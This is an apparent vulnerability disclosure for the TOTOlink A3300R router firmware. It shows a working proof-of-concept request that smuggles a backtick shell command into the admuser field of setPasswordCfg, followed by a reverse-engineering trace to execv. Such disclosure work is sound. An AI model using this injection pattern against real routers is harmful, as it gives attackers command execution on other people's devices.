# TOTOlink A3300R V17.0.0cu.557_B20221024 Command Injection

## Product Information
Device: TOTOlink A3300R
Firmware Version: V17.0.0cu.557_B20221024
Manufacturer's website information：https://www.totolink.net/
Firmware download address ：https://www.totolink.net/home/menu/detail/menu_listtpl/download/id/241/ids/36.html

## Vulnerability Description
When deal with setPasswordCfg request, admuser parameter is vulnerable to OS command injection.

### POC
```
POST /cgi-bin/cstecgi.cgi HTTP/1.1
Host: 192.168.44.132
Content-Length: 106
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://192.168.44.132
Referer: http://192.168.44.132/advance/changepwd.html
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8,zh-CN;q=0.7,zh;q=0.6
Connection: close

{"admuser":"admin`ls>/web/cmdi.txt`","admpass":"admin123","origPass":"admin","topicurl":"setPasswordCfg"}
```

injection the command "ls>/web/cmdi.txt"

![poc1](img/poc1.jpg)

check the result.
```
GET /cmdi.txt HTTP/1.1
Host: 192.168.44.132
Content-Length: 0
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://192.168.44.132
Referer: http://192.168.44.132/login.html
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8,zh-CN;q=0.7,zh;q=0.6
Connection: close


```

![poc2](img/poc2.jpg)

## Analyse
sub_414BE4 will handle the setPasswordCfg request. sub_414BE4 firstly get admuser from request body, then pass to Uci_Set_Str function.

![ana1](img/ana1.jpg)

Uci_Set_Str function Splicing uci command, and pass to CsteSystem function.

![ana2](img/ana2.jpg)

CsteSystem wraps the command and then passes it to execv to execute the command.

![ana3](img/ana3.jpg)